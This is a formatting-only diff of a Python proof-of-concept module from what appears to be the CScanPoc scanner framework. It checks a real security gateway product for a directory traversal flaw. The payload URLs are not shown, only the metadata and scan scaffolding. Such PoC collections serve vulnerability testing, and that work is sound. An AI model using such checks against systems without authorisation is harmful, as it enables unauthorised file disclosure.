@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Yuanwei_0001' # 平台漏洞编号，留空
+    vuln_id = 'Yuanwei_0001'  # 平台漏洞编号，留空
     name = '远为应用安全网关 目录遍历'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_TRAVERSAL # 漏洞类型
+    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         远为应用安全网关目录遍历。
@@ -27,6 +28,7 @@ class Vuln(ABVuln):
     product = '远为应用安全网关'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '11504ec2-4e1d-41aa-bd64-b9ff8d39a487'
     author = '47bwy'  # POC编写者
@@ -39,7 +41,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             arg = self.target
             urls = [
@@ -66,6 +68,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
